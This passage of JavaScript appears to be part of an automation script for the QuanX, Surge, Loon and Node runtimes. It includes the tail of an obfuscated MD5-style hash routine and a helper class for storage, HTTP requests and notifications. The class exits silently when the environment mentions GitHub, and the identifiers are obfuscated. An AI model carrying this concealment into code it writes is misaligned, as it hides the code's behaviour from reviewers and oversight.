    _0x2433ff = _0x2ded5a(_0x2433ff, _0x20505e, _0x419040, _0x5570b6, _0x150466[_0x3e043e + 1], _0x43fb8b, 2240044497);
    _0x5570b6 = _0x2ded5a(_0x5570b6, _0x2433ff, _0x20505e, _0x419040, _0x150466[_0x3e043e + 8], _0x150cff, 1873313359);
    _0x419040 = _0x2ded5a(_0x419040, _0x5570b6, _0x2433ff, _0x20505e, _0x150466[_0x3e043e + 15], _0x49b499, 4264355552);
    _0x20505e = _0x2ded5a(_0x20505e, _0x419040, _0x5570b6, _0x2433ff, _0x150466[_0x3e043e + 6], _0x345032, 2734768916);
    _0x2433ff = _0x2ded5a(_0x2433ff, _0x20505e, _0x419040, _0x5570b6, _0x150466[_0x3e043e + 13], _0x43fb8b, 1309151649);
    _0x5570b6 = _0x2ded5a(_0x5570b6, _0x2433ff, _0x20505e, _0x419040, _0x150466[_0x3e043e + 4], _0x150cff, 4149444226);
    _0x419040 = _0x2ded5a(_0x419040, _0x5570b6, _0x2433ff, _0x20505e, _0x150466[_0x3e043e + 11], _0x49b499, 3174756917);
    _0x20505e = _0x2ded5a(_0x20505e, _0x419040, _0x5570b6, _0x2433ff, _0x150466[_0x3e043e + 2], _0x345032, 718787259);
    _0x2433ff = _0x2ded5a(_0x2433ff, _0x20505e, _0x419040, _0x5570b6, _0x150466[_0x3e043e + 9], _0x43fb8b, 3951481745);
    _0x5570b6 = _0x3cb0a8(_0x5570b6, _0xf42f52);
    _0x2433ff = _0x3cb0a8(_0x2433ff, _0x47f290);
    _0x20505e = _0x3cb0a8(_0x20505e, _0x4bcb2b);
    _0x419040 = _0x3cb0a8(_0x419040, _0x30acb);
  }
  var _0x105977 = _0x1368a3(_0x5570b6) + _0x1368a3(_0x2433ff) + _0x1368a3(_0x20505e) + _0x1368a3(_0x419040);
  return _0x105977.toLowerCase();
}
function Env(e, s) {
  "undefined" != typeof process && JSON.stringify(process.env).indexOf("GITHUB") > -1 && process.exit(0);
  return new class {
    constructor(e, s) {
      this.name = e;
      this.notifyStr = "";
      this.startTime = new Date().getTime();
      Object.assign(this, s);
      console.log(`${this.name} 开始运行：
`);
    }
    isNode() {
      return "undefined" != typeof module && !!module.exports;
    }
    isQuanX() {
      return "undefined" != typeof $task;
    }
    isSurge() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }
    isLoon() {
      return "undefined" != typeof $loon;
    }
    getdata(e) {
      let s = this.getval(e);
      if (/^@/.test(e)) {
        let [, i, n] = /^@(.*?)\.(.*?)$/.exec(e),
          r = i ? this.getval(i) : "";
        if (r) {
          try {
            let o = JSON.parse(r);
            s = o ? this.lodash_get(o, n, "") : s;
          } catch (a) {
            s = "";
          }
        }
      }
      return s;
    }
    setdata(e, s) {
      let i = !1;
      if (/^@/.test(s)) {
        let [, n, r] = /^@(.*?)\.(.*?)$/.exec(s),
          o = this.getval(n);
        try {
          let a = JSON.parse(n ? "null" === o ? null : o || "{}" : "{}");
          this.lodash_set(a, r, e);
          i = this.setval(JSON.stringify(a), n);
        } catch (l) {
          let h = {};
          this.lodash_set(h, r, e);
          i = this.setval(JSON.stringify(h), n);
        }
      } else {
        i = this.setval(e, s);
      }
      return i;
    }
    getval(e) {
      return this.isSurge() || this.isLoon() ? $persistentStore.read(e) : this.isQuanX() ? $prefs.valueForKey(e) : this.isNode() ? (this.data = this.loaddata(), this.data[e]) : this.data && this.data[e] || null;
    }
    setval(e, s) {
      return this.isSurge() || this.isLoon() ? $persistentStore.write(e, s) : this.isQuanX() ? $prefs.setValueForKey(e, s) : this.isNode() ? (this.data = this.loaddata(), this.data[s] = e, this.writedata(), !0) : this.data && this.data[s] || null;
    }
    send(e, s, i = () => {}) {
      if ("get" != e && "post" != e && "put" != e && "delete" != e) {
        console.log(`无效的http方法：${e}`);
        return;
      }
      if ("get" == e && s.headers ? (delete s.headers["Content-Type"], delete s.headers["Content-Length"]) : s.body && s.headers && !s.headers["Content-Type"] && (s.headers["Content-Type"] = "application/x-www-form-urlencoded"), this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (s.headers = s.headers || {}, Object.assign(s.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        let n = {
          method: e,
          url: s.url,
          headers: s.headers,
          timeout: s.timeout,
          data: s.body
        };
        "get" == e && delete n.data;
        $axios(n).then(e => {
          let {
            status: s,
            request: n,
            headers: r,
            data: o
          } = e;
          i(null, n, {
            statusCode: s,
            headers: r,
            body: o
          });
        }).catch(e => console.log(e));
      } else {
        if (this.isQuanX()) {
          s.method = e.toUpperCase();
          this.isNeedRewrite && (s.opts = s.opts || {}, Object.assign(s.opts, {
            hints: !1
          }));
          $task.fetch(s).then(e => {
            let {
              statusCode: s,
              request: n,
              headers: r,
              body: o
            } = e;
            i(null, n, {
              statusCode: s,
              headers: r,
              body: o
            });
          }, e => i(e));
        } else {
          if (this.isNode()) {
            this.got = this.got ? this.got : require("got");
            let {
              url: r,
              ...o
            } = s;
            this.instance = this.got.extend({
              followRedirect: !1
            });
            this.instance[e](r, o).then(e => {
              let {
                statusCode: s,
                request: n,
                headers: r,
                body: o
              } = e;
              i(null, n, {
                statusCode: s,
                headers: r,
                body: o
              });
            }, e => {
              let {
                message: s,
                response: n
              } = e;
              i(s, n, n && n.body);
            });
          }
        }
      }
    }
    time(e) {
      let s = {
        "M+": new Date().getMonth() + 1,
        "d+": new Date().getDate(),
        "h+": new Date().getHours(),
        "m+": new Date().getMinutes(),
        "s+": new Date().getSeconds(),
        "q+": Math.floor((new Date().getMonth() + 3) / 3),
        S: new Date().getMilliseconds()
      };
      for (let i in /(y+)/.test(e) && (e = e.replace(RegExp.$1, (new Date().getFullYear() + "").substr(4 - RegExp.$1.length))), s) RegExp("(" + i + ")").test(e) && (e = e.replace(RegExp.$1, 1 == RegExp.$1.length ? s[i] : ("00" + s[i]).substr(("" + s[i]).length)));
      return e;
    }
    async showmsg() {
      if (!this.notifyStr) {
        return;
      }
      let e = this.name + " 运行通知\n\n" + this.notifyStr;
      if ($.isNode()) {
        var s = require("./sendNotify");
        console.log("\n============== 推送 ==============");
        await s.sendNotify(this.name, e);
      } else {
        this.msg(e);
      }
    }
    logAndNotify(e) {
      console.log(e);
      this.notifyStr += e;
      this.notifyStr += "\n";
    }
    msg(e = t, s = "", i = "", n) {
      let r = e => {
        if (!e) {
          return e;
        }
        if ("string" == typeof e) {
          return this.isLoon() ? e : this.isQuanX() ? {
            "open-url": e
          } : this.isSurge() ? {
            url: e
          } : void 0;
        }
        if ("object" == typeof e) {
          if (this.isLoon()) {
            return {
              openUrl: e.openUrl || e.url || e["open-url"],
              mediaUrl: e.mediaUrl || e["media-url"]
            };
          }
          if (this.isQuanX()) {
            return {
              "open-url": e["open-url"] || e.url || e.openUrl,
              "media-url": e["media-url"] || e.mediaUrl
            };
          }
          if (this.isSurge()) {
            return {
              url: e.url || e.openUrl || e["open-url"]
            };
          }
        }
      };
      this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, r(n)) : this.isQuanX() && $notify(e, s, i, r(n)));
      let o = ["", "============== 系统通知 =============="];
      o.push(e);
      s && o.push(s);
      i && o.push(i);
      console.log(o.join("\n"));
    }
    getMin(e, s) {
      return e < s ? e : s;
    }
    getMax(e, s) {
      return e < s ? s : e;
    }
    padStr(e, s, i = "0") {
      let n = String(e),
        r = s > n.length ? s - n.length : 0,
        o = "";
      for (let a = 0; a < r; a++) {
        o += i;
      }
      return o + n;
    }
    json2str(e, s, i = !1) {
      let n = [];
      for (let r of Object.keys(e).sort()) {
        let o = e[r];
        o && i && (o = encodeURIComponent(o));
        n.push(r + "=" + o);
      }
      return n.join(s);
    }
    str2json(e, s = !1) {
      let i = {};
      for (let n of e.split("&")) {
        if (!n) {
          continue;
        }
        let r = n.indexOf("=");
        if (-1 == r) {
          continue;
        }
        let o = n.substr(0, r),
          a = n.substr(r + 1);
        s && (a = decodeURIComponent(a));
        i[o] = a;
      }
      return i;
    }
    randomString(e, s = "abcdef0123456789") {
      let i = "";
      for (let n = 0; n < e; n++) {
        i += s.charAt(Math.floor(Math.random() * s.length));
      }
      return i;
    }
    randomList(e) {
      return e[Math.floor(Math.random() * e.length)];
    }
    wait(e) {
      return new Promise(s => setTimeout(s, e));
    }
    done(e = {}) {
      let s = new Date().getTime(),
        i = (s - this.startTime) / 1000;
      console.log(`
${this.name} 运行结束，共运行了 ${i} 秒！`);
      (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(e);
    }
  }(e, s);
}